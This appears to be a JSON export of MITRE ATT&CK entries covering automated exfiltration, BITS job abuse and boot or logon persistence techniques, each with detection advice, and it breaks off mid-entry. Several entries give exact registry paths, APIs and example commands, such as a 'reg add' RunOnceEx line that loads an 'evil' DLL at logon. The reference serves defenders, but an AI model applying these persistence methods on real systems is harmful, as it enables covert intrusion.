{"ID":"T1020","name":"Automated Exfiltration","description":"Adversaries may exfiltrate data, such as sensitive documents, through the use of automated processing after being gathered during Collection. \n\nWhen automated exfiltration is used, other exfiltration techniques likely apply as well to transfer the information out of the network, such as [Exfiltration Over C2 Channel](https://attack.mitre.org/techniques/T1041) and [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).","url":"https://attack.mitre.org/techniques/T1020","created":"31 May 2017","last modified":"19 April 2022","version":"1.2","tactics":"Exfiltration","detection":"Monitor process file access patterns and network behavior. Unrecognized processes or scripts that appear to be traversing file systems and sending network traffic may be suspicious.","platforms":"Linux, Network, Windows, macOS","data sources":"Command: Command Execution, File: File Access, Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Script: Script Execution","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"ExtraHop","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft NICKEL December 2021),(Citation: ESET LightNeuron May 2019),(Citation: Intezer Doki July 20),(Citation: FOX-IT May 2016 Mofang),(Citation: Proofpoint Operation Transparent Tribe March 2016),(Citation: ATT Sidewinder January 2021),(Citation: Forcepoint Monsoon),(Citation: ESET Sednit USBStealer 2014),(Citation: ESET Machete July 2019),(Citation: Palo Alto Rover),(Citation: Talos Frankenstein June 2019),(Citation: ESET Attor Oct 2019),(Citation: Kaspersky TajMahal April 2019),(Citation: Talos Promethium June 2020),(Citation: Bitdefender StrongPity June 2020),(Citation: ESET Crutch December 2020),(Citation: F-Secure Cosmicduke),(Citation: ESET Windigo Mar 2014),(Citation: TrendMicro Tropic Trooper May 2020),(Citation: ESET Gamaredon June 2020),(Citation: Palo Alto Unit 42 OutSteel SaintBot February 2022 ),"}
{"ID":"T1020.001","name":"Automated Exfiltration: Traffic Duplication","description":"Adversaries may leverage traffic mirroring in order to automate data exfiltration over compromised infrastructure. Traffic mirroring is a native feature for some devices, often used for network analysis. For example, devices may be configured to forward network traffic to one or more destinations for analysis by a network analyzer or other monitoring device. (Citation: Cisco Traffic Mirroring)(Citation: Juniper Traffic Mirroring)\n\nAdversaries may abuse traffic mirroring to mirror or redirect network traffic through other infrastructure they control. Malicious modifications to network devices to enable traffic redirection may be possible through [ROMMONkit](https://attack.mitre.org/techniques/T1542/004) or [Patch System Image](https://attack.mitre.org/techniques/T1601/001).(Citation: US-CERT-TA18-106A)(Citation: Cisco Blog Legacy Device Attacks)\n\nMany cloud-based environments also support traffic mirroring. For example, AWS Traffic Mirroring, GCP Packet Mirroring, and Azure vTap allow users to define specified instances to collect traffic from and specified targets to send collected traffic to.(Citation: AWS Traffic Mirroring)(Citation: GCP Packet Mirroring)(Citation: Azure Virtual Network TAP)\n\nAdversaries may use traffic duplication in conjunction with [Network Sniffing](https://attack.mitre.org/techniques/T1040), [Input Capture](https://attack.mitre.org/techniques/T1056), or [Adversary-in-the-Middle](https://attack.mitre.org/techniques/T1557) depending on the goals and objectives of the adversary.","url":"https://attack.mitre.org/techniques/T1020/001","created":"19 October 2020","last modified":"14 April 2023","version":"1.2","tactics":"Exfiltration","detection":"Monitor network traffic for uncommon data flows (e.g. unusual network communications, suspicious communications that have never been seen before, communications sending fixed size data packets at regular intervals).  Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used. ","platforms":"IaaS, Network","data sources":"Network Traffic: Network Connection Creation, Network Traffic: Network Traffic Flow","is sub-technique":true,"sub-technique of":"T1020","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1197","name":"BITS Jobs","description":"Adversaries may abuse BITS jobs to persistently execute code and perform various background tasks. Windows Background Intelligent Transfer Service (BITS) is a low-bandwidth, asynchronous file transfer mechanism exposed through [Component Object Model](https://attack.mitre.org/techniques/T1559/001) (COM).(Citation: Microsoft COM)(Citation: Microsoft BITS) BITS is commonly used by updaters, messengers, and other applications preferred to operate in the background (using available idle bandwidth) without interrupting other networked applications. File transfer tasks are implemented as BITS jobs, which contain a queue of one or more file operations.\n\nThe interface to create and manage BITS jobs is accessible through [PowerShell](https://attack.mitre.org/techniques/T1059/001) and the [BITSAdmin](https://attack.mitre.org/software/S0190) tool.(Citation: Microsoft BITS)(Citation: Microsoft BITSAdmin)\n\nAdversaries may abuse BITS to download (e.g. [Ingress Tool Transfer](https://attack.mitre.org/techniques/T1105)), execute, and even clean up after running malicious code (e.g. [Indicator Removal](https://attack.mitre.org/techniques/T1070)). BITS tasks are self-contained in the BITS job database, without new files or registry modifications, and often permitted by host firewalls.(Citation: CTU BITS Malware June 2016)(Citation: Mondok Windows PiggyBack BITS May 2007)(Citation: Symantec BITS May 2007) BITS enabled execution may also enable persistence by creating long-standing jobs (the default maximum lifetime is 90 days and extendable) or invoking an arbitrary program when a job completes or errors (including after system reboots).(Citation: PaloAlto UBoatRAT Nov 2017)(Citation: CTU BITS Malware June 2016)\n\nBITS upload functionalities can also be used to perform [Exfiltration Over Alternative Protocol](https://attack.mitre.org/techniques/T1048).(Citation: CTU BITS Malware June 2016)","url":"https://attack.mitre.org/techniques/T1197","created":"18 April 2018","last modified":"21 April 2023","version":"1.4","tactics":"Defense Evasion, Persistence","detection":"BITS runs as a service and its status can be checked with the Sc query utility (<code>sc query bits</code>).(Citation: Microsoft Issues with BITS July 2011) Active BITS tasks can be enumerated using the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (<code>bitsadmin /list /allusers /verbose</code>).(Citation: Microsoft BITS)\n\nMonitor usage of the [BITSAdmin](https://attack.mitre.org/software/S0190) tool (especially the ‘Transfer’, 'Create', 'AddFile', 'SetNotifyFlags', 'SetNotifyCmdLine', 'SetMinRetryDelay', 'SetCustomHeaders', and 'Resume' command options)(Citation: Microsoft BITS) Admin logs, PowerShell logs, and the Windows Event log for BITS activity.(Citation: Elastic - Hunting for Persistence Part 1) Also consider investigating more detailed information about jobs by parsing the BITS job database.(Citation: CTU BITS Malware June 2016)\n\nMonitor and analyze network activity generated by BITS. BITS jobs use HTTP(S) and SMB for remote connections and are tethered to the creating user and will only function when that user is logged on (this rule applies even if a user attaches the job to a service account).(Citation: Microsoft BITS)","platforms":"Windows","data sources":"Command: Command Execution, Network Traffic: Network Connection Creation, Process: Process Creation, Service: Service Metadata","is sub-technique":false,"sub-technique of":null,"defenses bypassed":"Firewall, Host forensic analysis","contributors":"Brent Murphy, Elastic; David French, Elastic; Red Canary; Ricardo Dias","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NCC Group Team9 June 2020),(Citation: FBI FLASH APT39 September 2020),(Citation: Microsoft PLATINUM April 2016),(Citation: Kaspersky Ferocious Kitten Jun 2021),(Citation: CobaltStrike Scripted Web Delivery),(Citation: FireEye Periscope March 2018),(Citation: Group IB Ransomware September 2020),(Citation: Unit 42 BackConfig May 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: TrendMicro Tropic Trooper Mar 2018),(Citation: Intrinsec Egregor Nov 2020),(Citation: Crowdstrike GTR2020 Mar 2020),(Citation: PaloAlto UBoatRAT Nov 2017),(Citation: Cobalt Strike Manual 4.3 November 2020),(Citation: FireEye APT41 March 2020),(Citation: Microsoft BITS),(Citation: Symantec BITS May 2007)"}
{"ID":"T1547","name":"Boot or Logon Autostart Execution","description":"Adversaries may configure system settings to automatically execute a program during system boot or logon to maintain persistence or gain higher-level privileges on compromised systems. Operating systems may have mechanisms for automatically running a program on system boot or account logon.(Citation: Microsoft Run Key)(Citation: MSDN Authentication Packages)(Citation: Microsoft TimeProvider)(Citation: Cylance Reg Persistence Sept 2013)(Citation: Linux Kernel Programming) These mechanisms may include automatically executing programs that are placed in specially designated directories or are referenced by repositories that store configuration information, such as the Windows Registry. An adversary may achieve the same goal by modifying or extending features of the kernel.\n\nSince some boot or logon autostart programs run with higher privileges, an adversary may leverage these to elevate privileges.","url":"https://attack.mitre.org/techniques/T1547","created":"23 January 2020","last modified":"30 March 2023","version":"1.1","tactics":"Persistence, Privilege Escalation","detection":"Monitor for additions or modifications of mechanisms that could be used to trigger autostart execution, such as relevant additions to the Registry. Look for changes that are not correlated with known updates, patches, or other planned administrative activity. Tools such as Sysinternals Autoruns may also be used to detect system autostart configuration changes that could be attempts at persistence.(Citation: TechNet Autoruns)  Changes to some autostart configuration settings may happen under normal conditions when legitimate software is installed. \n\nSuspicious program execution as autostart programs may show up as outlier processes that have not been seen before when compared against historical data.To increase confidence of malicious activity, data and events should not be viewed in isolation, but as part of a chain of behavior that could lead to other activities, such as network connections made for Command and Control, learning details about the environment through Discovery, and Lateral Movement.\n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not normally loaded into a process. Look for abnormal process behavior that may be due to a process loading a malicious DLL.\n\nMonitor for abnormal usage of utilities and command-line parameters involved in kernel modification or driver installation.","platforms":"Linux, Windows, macOS","data sources":"Command: Command Execution, Driver: Driver Load, File: File Creation, File: File Modification, Kernel: Kernel Module Load, Module: Module Load, Process: OS API Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":"Administrator, root, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Cylance Dust Storm),(Citation: Securelist Dtrack),(Citation: Checkpoint IndigoZebra July 2021),"}
{"ID":"T1547.014","name":"Boot or Logon Autostart Execution: Active Setup","description":"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.(Citation: Klein Active Setup 2010) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nAdversaries may abuse Active Setup by creating a key under <code> HKLM\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code> and setting a malicious value for <code>StubPath</code>. This value will serve as the program that will be executed when a user logs into the computer.(Citation: Mandiant Glyer APT 2010)(Citation: Citizenlab Packrat 2015)(Citation: FireEye CFR Watering Hole 2012)(Citation: SECURELIST Bright Star 2015)(Citation: paloalto Tropic Trooper 2016)\n\nAdversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots. Adversaries may also use [Masquerading](https://attack.mitre.org/techniques/T1036) to make the Registry entries look as if they are associated with legitimate programs.","url":"https://attack.mitre.org/techniques/T1547/014","created":"18 December 2020","last modified":"22 March 2023","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor Registry key additions and/or modifications to <code>HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Active Setup\\Installed Components\\</code>.\n\nTools such as Sysinternals Autoruns may also be used to detect system changes that could be attempts at persistence, including listing the Active Setup Registry locations and startup folders.(Citation: TechNet Autoruns) Suspicious program execution as startup programs may show up as outlier processes that have not been seen before when compared against historical data.","platforms":"Windows","data sources":"Command: Command Execution, Process: Process Creation, Windows Registry: Windows Registry Key Creation, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":"Bencherchali Nasreddine, @nas_bench, ELIT Security Team (DSSD)","permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft PoisonIvy 2017),(Citation: paloalto Tropic Trooper 2016),(Citation: FireEye Regsvr32 Targeting Mongolian Gov),"}
{"ID":"T1547.002","name":"Boot or Logon Autostart Execution: Authentication Package","description":"Adversaries may abuse authentication packages to execute DLLs when the system boots. Windows authentication package DLLs are loaded by the Local Security Authority (LSA) process at system start. They provide support for multiple logon processes and multiple security protocols to the operating system.(Citation: MSDN Authentication Packages)\n\nAdversaries can use the autostart mechanism provided by LSA authentication packages for persistence by placing a reference to a binary in the Windows Registry location <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Lsa\\</code> with the key value of <code>\"Authentication Packages\"=&lt;target binary&gt;</code>. The binary will then be executed by the system when the authentication packages are loaded.","url":"https://attack.mitre.org/techniques/T1547/002","created":"24 January 2020","last modified":"20 April 2022","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor the Registry for changes to the LSA Registry keys. Monitor the LSA process for DLL loads. Windows 8.1 and Windows Server 2012 R2 may generate events when unsigned DLLs try to load into the LSA by setting the Registry key <code>HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\LSASS.exe</code> with AuditLevel = 8. (Citation: Graeber 2014) (Citation: Microsoft Configure LSA)","platforms":"Windows","data sources":"Command: Command Execution, Module: Module Load, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":null,"permissions required":"Administrator","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Crysys Skywiper),(Citation: Microsoft Configure LSA),(Citation: Graeber 2014)"}
{"ID":"T1547.006","name":"Boot or Logon Autostart Execution: Kernel Modules and Extensions","description":"Adversaries may modify the kernel to automatically execute programs on system boot. Loadable Kernel Modules (LKMs) are pieces of code that can be loaded and unloaded into the kernel upon demand. They extend the functionality of the kernel without the need to reboot the system. For example, one type of module is the device driver, which allows the kernel to access hardware connected to the system.(Citation: Linux Kernel Programming) \n\nWhen used maliciously, LKMs can be a type of kernel-mode [Rootkit](https://attack.mitre.org/techniques/T1014) that run with the highest operating system privilege (Ring 0).(Citation: Linux Kernel Module Programming Guide) Common features of LKM based rootkits include: hiding itself, selective hiding of files, processes and network activity, as well as log tampering, providing authenticated backdoors, and enabling root access to non-privileged users.(Citation: iDefense Rootkit Overview)\n\nKernel extensions, also called kext, are used in macOS to load functionality onto a system similar to LKMs for Linux. Since the kernel is responsible for enforcing security and the kernel extensions run as apart of the kernel, kexts are not governed by macOS security policies. Kexts are loaded and unloaded through <code>kextload</code> and <code>kextunload</code> commands. Kexts need to be signed with a developer ID that is granted privileges by Apple allowing it to sign Kernel extensions. Developers without these privileges may still sign kexts but they will not load unless SIP is disabled. If SIP is enabled, the kext signature is verified before being added to the AuxKC.(Citation: System and kernel extensions in macOS)\n\nSince macOS Catalina 10.15, kernel extensions have been deprecated in favor of System Extensions. However, kexts are still allowed as \"Legacy System Extensions\" since there is no System Extension for Kernel Programming Interfaces.(Citation: Apple Kernel Extension Deprecation)\n\nAdversaries can use LKMs and kexts to conduct [Persistence](https://attack.mitre.org/tactics/TA0003) and/or [Privilege Escalation](https://attack.mitre.org/tactics/TA0004) on a system. Examples have been found in the wild, and there are some relevant open source projects as well.(Citation: Volatility Phalanx2)(Citation: CrowdStrike Linux Rootkit)(Citation: GitHub Reptile)(Citation: GitHub Diamorphine)(Citation: RSAC 2015 San Francisco Patrick Wardle)(Citation: Synack Secure Kernel Extension Broken)(Citation: Securelist Ventir)(Citation: Trend Micro Skidmap)","url":"https://attack.mitre.org/techniques/T1547/006","created":"24 January 2020","last modified":"20 April 2022","version":"1.3","tactics":"Persistence, Privilege Escalation","detection":"Loading, unloading, and manipulating modules on Linux systems can be detected by monitoring for the following commands: <code>modprobe</code>, <code>insmod</code>, <code>lsmod</code>, <code>rmmod</code>, or <code>modinfo</code> (Citation: Linux Loadable Kernel Module Insert and Remove LKMs) LKMs are typically loaded into <code>/lib/modules</code> and have had the extension .ko (\"kernel object\") since version 2.6 of the Linux kernel. (Citation: Wikipedia Loadable Kernel Module)\n\nAdversaries may run commands on the target system before loading a malicious module in order to ensure that it is properly compiled. (Citation: iDefense Rootkit Overview) Adversaries may also execute commands to identify the exact version of the running Linux kernel and/or download multiple versions of the same .ko (kernel object) files to use the one appropriate for the running system.(Citation: Trend Micro Skidmap) Many LKMs require Linux headers (specific to the target kernel) in order to compile properly. These are typically obtained through the operating systems package manager and installed like a normal package. On Ubuntu and Debian based systems this can be accomplished by running: <code>apt-get install linux-headers-$(uname -r)</code> On RHEL and CentOS based systems this can be accomplished by running: <code>yum install kernel-devel-$(uname -r)</code>\n\nOn macOS, monitor for execution of <code>kextload</code> commands and user installed kernel extensions performing abnormal and/or potentially malicious activity (such as creating network connections). Monitor for new rows added in the <code>kext_policy</code> table. KextPolicy stores a list of user approved (non Apple) kernel extensions and a partial history of loaded kernel modules in a SQLite database, <code>/var/db/SystemPolicyConfiguration/KextPolicy</code>.(Citation: User Approved Kernel Extension Pike’s)(Citation: Purves Kextpocalypse 2)(Citation: Apple Developer Configuration Profile)\n","platforms":"Linux, macOS","data sources":"Command: Command Execution, File: File Creation, File: File Modification, Kernel: Kernel Module Load, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":"Anastasios Pingios; Eric Kaiser @ideologysec; Jeremy Galloway; Red Canary; Wayne Silva, F-Secure Countercept","permissions required":"root","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: NSA/FBI Drovorub August 2020),(Citation: Trend Micro Skidmap),(Citation: Cybereason OperationCuckooBees May 2022),(Citation: Chkrootkit Main),(Citation: Apple TN2459 Kernel Extensions),(Citation: LKM loading kernel restrictions),(Citation: Increasing Linux kernel integrity),(Citation: Wikibooks Grsecurity),(Citation: SourceForge rkhunter),(Citation: MDMProfileConfigMacOS),(Citation: Kernel.org Restrict Kernel Module),(Citation: Kernel Self Protection Project)"}
{"ID":"T1547.008","name":"Boot or Logon Autostart Execution: LSASS Driver","description":"Adversaries may modify or add LSASS drivers to obtain persistence on compromised systems. The Windows security subsystem is a set of components that manage and enforce the security policy for a computer or domain. The Local Security Authority (LSA) is the main component responsible for local security policy and user authentication. The LSA includes multiple dynamic link libraries (DLLs) associated with various other security functions, all of which run in the context of the LSA Subsystem Service (LSASS) lsass.exe process.(Citation: Microsoft Security Subsystem)\n\nAdversaries may target LSASS drivers to obtain persistence. By either replacing or adding illegitimate drivers (e.g., [Hijack Execution Flow](https://attack.mitre.org/techniques/T1574)), an adversary can use LSA operations to continuously execute malicious payloads.","url":"https://attack.mitre.org/techniques/T1547/008","created":"24 January 2020","last modified":"20 April 2022","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"With LSA Protection enabled, monitor the event logs (Events 3033 and 3063) for failed attempts to load LSA plug-ins and drivers. (Citation: Microsoft LSA Protection Mar 2014) Also monitor DLL load operations in lsass.exe. (Citation: Microsoft DLL Security)\n\nUtilize the Sysinternals Autoruns/Autorunsc utility (Citation: TechNet Autoruns) to examine loaded drivers associated with the LSA. ","platforms":"Windows","data sources":"Driver: Driver Load, File: File Creation, File: File Modification, Module: Module Load","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":"Vincent Le Toux","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Microsoft SIR Vol 21),(Citation: Microsoft Wingbird Nov 2017),(Citation: Symantec Pasam May 2012),(Citation: Microsoft Enable Cred Guard April 2017),(Citation: Microsoft Credential Guard April 2017),(Citation: Microsoft LSA Protection Mar 2014),(Citation: Microsoft DLL Security)"}
{"ID":"T1547.015","name":"Boot or Logon Autostart Execution: Login Items","description":"Adversaries may add login items to execute upon user login to gain persistence or escalate privileges. Login items are applications, documents, folders, or server connections that are automatically launched when a user logs in.(Citation: Open Login Items Apple) Login items can be added via a shared file list or Service Management Framework.(Citation: Adding Login Items) Shared file list login items can be set using scripting languages such as [AppleScript](https://attack.mitre.org/techniques/T1059/002), whereas the Service Management Framework uses the API call <code>SMLoginItemSetEnabled</code>.\n\nLogin items installed using the Service Management Framework leverage <code>launchd</code>, are not visible in the System Preferences, and can only be removed by the application that created them.(Citation: Adding Login Items)(Citation: SMLoginItemSetEnabled Schroeder 2013) Login items created using a shared file list are visible in System Preferences, can hide the application when it launches, and are executed through LaunchServices, not launchd, to open applications, documents, or URLs without using Finder.(Citation: Launch Services Apple Developer) Users and applications use login items to configure their user environment to launch commonly used services or applications, such as email, chat, and music applications.\n\nAdversaries can utilize [AppleScript](https://attack.mitre.org/techniques/T1059/002) and [Native API](https://attack.mitre.org/techniques/T1106) calls to create a login item to spawn malicious executables.(Citation: ELC Running at startup) Prior to version 10.5 on macOS, adversaries can add login items by using [AppleScript](https://attack.mitre.org/techniques/T1059/002) to send an Apple events to the “System Events” process, which has an AppleScript dictionary for manipulating login items.(Citation: Login Items AE) Adversaries can use a command such as <code>tell application “System Events” to make login item at end with properties /path/to/executable</code>.(Citation: Startup Items Eclectic)(Citation: hexed osx.dok analysis 2019)(Citation: Add List Remove Login Items Apple Script) This command adds the path of the malicious executable to the login item file list located in <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code>.(Citation: Startup Items Eclectic) Adversaries can also use login items to launch executables that can be used to control the victim system remotely or as a means to gain privilege escalation by prompting for user credentials.(Citation: objsee mac malware 2017)(Citation: CheckPoint Dok)(Citation: objsee netwire backdoor 2019)","url":"https://attack.mitre.org/techniques/T1547/015","created":"05 October 2021","last modified":"18 October 2021","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"All login items created via shared file lists are viewable by using the System Preferences GUI or in the <code>~/Library/Application Support/com.apple.backgroundtaskmanagementagent/backgrounditems.btm</code> file.(Citation: Open Login Items Apple)(Citation: Startup Items Eclectic)(Citation: objsee block blocking login items)(Citation: sentinelone macos persist Jun 2019) These locations should be monitored and audited for known good applications.\n\nOtherwise, login Items are located in <code>Contents/Library/LoginItems</code> within an application bundle, so these paths should be monitored as well.(Citation: Adding Login Items) Monitor applications that leverage login items with either the LSUIElement or LSBackgroundOnly key in the Info.plist file set to true.(Citation: Adding Login Items)(Citation: Launch Service Keys Developer Apple)\n\nMonitor processes that start at login for unusual or unknown applications. Usual applications for login items could include what users add to configure their user environment, such as email, chat, or music applications, or what administrators include for organization settings and protections. Check for running applications from login items that also have abnormal behavior,, such as establishing network connections.","platforms":"macOS","data sources":"File: File Creation, File: File Modification, Process: Process Creation","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Glitch-Cat Green Lambert ATTCK Oct 2021),(Citation: Objective See Green Lambert for OSX Oct 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: hexed osx.dok analysis 2019),"}
{"ID":"T1547.010","name":"Boot or Logon Autostart Execution: Port Monitors","description":"Adversaries may use port monitors to run an adversary supplied DLL during system boot for persistence or privilege escalation. A port monitor can be set through the <code>AddMonitor</code> API call to set a DLL to be loaded at startup.(Citation: AddMonitor) This DLL can be located in <code>C:\\Windows\\System32</code> and will be loaded by the print spooler service, spoolsv.exe, on boot. The spoolsv.exe process also runs under SYSTEM level permissions.(Citation: Bloxham) Alternatively, an arbitrary DLL can be loaded if permissions allow writing a fully-qualified pathname for that DLL to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. \n\nThe Registry key contains entries for the following:\n\n* Local Port\n* Standard TCP/IP Port\n* USB Monitor\n* WSD Port\n\nAdversaries can use this technique to load malicious code at startup that will persist on system reboot and execute as SYSTEM.","url":"https://attack.mitre.org/techniques/T1547/010","created":"24 January 2020","last modified":"20 April 2022","version":"1.1","tactics":"Persistence, Privilege Escalation","detection":"Monitor process API calls to <code>AddMonitor</code>.(Citation: AddMonitor) Monitor DLLs that are loaded by spoolsv.exe for DLLs that are abnormal. New DLLs written to the System32 directory that do not correlate with known good software or patching may be suspicious. \n\nMonitor Registry writes to <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Monitors</code>. Run the Autoruns utility, which checks for this Registry key as a persistence mechanism.(Citation: TechNet Autoruns)","platforms":"Windows","data sources":"File: File Creation, Module: Module Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":"Stefan Kanthak; Travis Smith, Tripwire","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":"SYSTEM","relationship citations":","}
{"ID":"T1547.012","name":"Boot or Logon Autostart Execution: Print Processors","description":"Adversaries may abuse print processors to run malicious DLLs during system boot for persistence and/or privilege escalation. Print processors are DLLs that are loaded by the print spooler service, spoolsv.exe, during boot. \n\nAdversaries may abuse the print spooler service by adding print processors that load malicious DLLs at startup. A print processor can be installed through the <code>AddPrintProcessor</code> API call with an account that has <code>SeLoadDriverPrivilege</code> enabled. Alternatively, a print processor can be registered to the print spooler service by adding the <code>HKLM\\SYSTEM\\\\[CurrentControlSet or ControlSet001]\\Control\\Print\\Environments\\\\[Windows architecture: e.g., Windows x64]\\Print Processors\\\\[user defined]\\Driver</code> Registry key that points to the DLL. For the print processor to be correctly installed, it must be located in the system print-processor directory that can be found with the <code>GetPrintProcessorDirectory</code> API call.(Citation: Microsoft AddPrintProcessor May 2018) After the print processors are installed, the print spooler service, which starts during boot, must be restarted in order for them to run.(Citation: ESET PipeMon May 2020) The print spooler service runs under SYSTEM level permissions, therefore print processors installed by an adversary may run under elevated privileges.","url":"https://attack.mitre.org/techniques/T1547/012","created":"05 October 2020","last modified":"09 October 2020","version":"1.0","tactics":"Persistence, Privilege Escalation","detection":"Monitor process API calls to <code>AddPrintProcessor</code> and <code>GetPrintProcessorDirectory</code>. New print processor DLLs are written to the print processor directory. Also monitor Registry writes to <code>HKLM\\SYSTEM\\ControlSet001\\Control\\Print\\Environments\\\\[Windows architecture]\\Print Processors\\\\[user defined]\\\\Driver</code> or <code>HKLM\\SYSTEM\\CurrentControlSet\\Control\\Print\\Environments\\\\[Windows architecture]\\Print Processors\\\\[user defined]\\Driver</code> as they pertain to print processor installations.\n\nMonitor for abnormal DLLs that are loaded by spoolsv.exe. Print processors that do not correlate with known good software or patching may be suspicious.","platforms":"Windows","data sources":"Driver: Driver Load, File: File Creation, Module: Module Load, Process: OS API Execution, Windows Registry: Windows Registry Key Modification","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":"Mathieu Tartare, ESET","permissions required":"Administrator, SYSTEM","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ESET PipeMon May 2020),(Citation: ESET Gelsemium June 2021),(Citation: TrendMicro EarthLusca 2022),"}
{"ID":"T1547.007","name":"Boot or Logon Autostart Execution: Re-opened Applications","description":"Adversaries may modify plist files to automatically run an application when a user logs in. When a user logs out or restarts via the macOS Graphical User Interface (GUI), a prompt is provided to the user with a checkbox to \"Reopen windows when logging back in\".(Citation: Re-Open windows on Mac) When selected, all applications currently open are added to a property list file named <code>com.apple.loginwindow.[UUID].plist</code> within the <code>~/Library/Preferences/ByHost</code> directory.(Citation: Methods of Mac Malware Persistence)(Citation: Wardle Persistence Chapter) Applications listed in this file are automatically reopened upon the user’s next logon.\n\nAdversaries can establish [Persistence](https://attack.mitre.org/tactics/TA0003) by adding a malicious application path to the <code>com.apple.loginwindow.[UUID].plist</code> file to execute payloads when a user logs in.","url":"https://attack.mitre.org/techniques/T1547/007","created":"24 January 2020","last modified":"19 April 2022","version":"1.1","tactics":"Persistence, Privilege Escalation","detection":"Monitoring the specific plist files associated with reopening applications can indicate when an application has registered itself to be reopened.","platforms":"macOS","data sources":"Command: Command Execution, File: File Modification","is sub-technique":true,"sub-technique of":"T1547","defenses bypassed":null,"contributors":null,"permissions required":"User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":",(Citation: Re-Open windows on Mac)"}
{"ID":"T1547.001","name":"Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder","description":"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the \"run keys\" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.(Citation: Microsoft Run Key) These programs will be executed under the context of the user and will have the account's associated permissions level.\n\nPlacing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is <code>C:\\Users\\\\[Username]\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup</code>. The startup folder path for all users is <code>C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp</code>.\n\nThe following run keys are created by default on Windows systems:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run</code>\n* <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnce</code>\n\nRun keys may exist under multiple hives.(Citation: Microsoft Wow6432Node 2018)(Citation: Malwarebytes Wow6432Node 2016) The <code>HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx</code> is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.(Citation: Microsoft Run Key) For example, it is possible to load a DLL at logon using a \"Depend\" key with RunOnceEx: <code>reg add HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnceEx\\0001\\Depend /v 1 /d \"C:\\temp\\evil[.]dll\"</code> (Citation: Oddvar Moe RunOnceEx Mar 2018)\n\nThe following Registry keys can be used to set startup folder items for persistence:\n\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\User Shell Folders</code>\n* <code>HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders</code>\n* 